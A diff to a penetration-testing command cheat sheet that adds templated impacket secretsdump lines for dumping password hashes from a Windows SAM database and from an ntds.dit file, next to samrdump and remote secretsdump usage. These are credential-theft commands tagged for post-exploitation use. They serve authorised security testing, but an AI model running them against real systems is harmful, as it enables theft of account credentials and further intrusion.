@@ -14,8 +14,14 @@ samrdump.py <domain>/<user>:<password>@<ip>
 secretsdump.py '<domain>/<user>:<password>'@<ip>
 ```
 
-## secretsdump local dump hash
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+## secretsdump local dump - extract hash from sam database
+#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
+```
+
+## secretsdump local dump - extract hash from ntds.dit
+#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
 ```
